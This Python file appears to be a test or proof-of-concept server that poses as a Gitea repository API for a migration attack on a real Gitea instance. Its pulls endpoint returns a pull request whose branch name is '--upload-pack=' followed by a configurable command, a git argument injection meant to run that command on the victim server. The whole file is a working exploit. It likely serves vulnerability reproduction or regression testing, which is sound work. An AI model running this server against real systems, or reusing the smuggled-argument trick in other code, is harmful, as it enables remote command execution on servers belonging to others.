"""Attacker-side migration API for native controls; the victim is genuine Gitea."""

import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit


state = {"requests": []}


class Handler(BaseHTTPRequestHandler):
    def reply(self, status, document):
        encoded = json.dumps(document).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def do_POST(self):
        if self.path != "/configure":
            return self.reply(404, {})
        document = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        state.clear()
        state.update(document)
        state["requests"] = []
        self.reply(200, {"configured": True})

    def do_GET(self):
        if self.path == "/observations":
            return self.reply(200, state)
        state["requests"].append({"path": self.path, "headers": dict(self.headers)})
        parsed = urlsplit(self.path)
        path = parsed.path
        if path == "/api/v1/version":
            return self.reply(200, {"version": "1.16.6"})
        if path == "/api/v1/settings/api":
            return self.reply(200, {"max_response_items": 50, "default_paging_num": 30,
                                    "default_git_trees_per_page": 1000,
                                    "default_max_blob_size": 10485760})
        repo_path = "/api/v1/repos/" + state.get("repository", "unconfigured")
        if path == repo_path:
            return self.reply(200, state["metadata"])
        if path == repo_path + "/topics":
            return self.reply(200, {"topics": []})
        if path == repo_path + "/pulls":
            if state.get("command") and parse_qs(parsed.query).get("page", ["1"]) == ["1"]:
                return self.reply(200, [{"base": {"ref": "master"},
                                        "head": {"ref": "--upload-pack=" + state["command"],
                                                 "repo": {"clone_url": "./", "owner": {"login": "master"}}},
                                        "updated_at": "2001-01-01T05:00:00+01:00", "user": {}}])
            return self.reply(200, [])
        self.reply(404, {"message": "Unknown attacker-side endpoint"})


ThreadingHTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
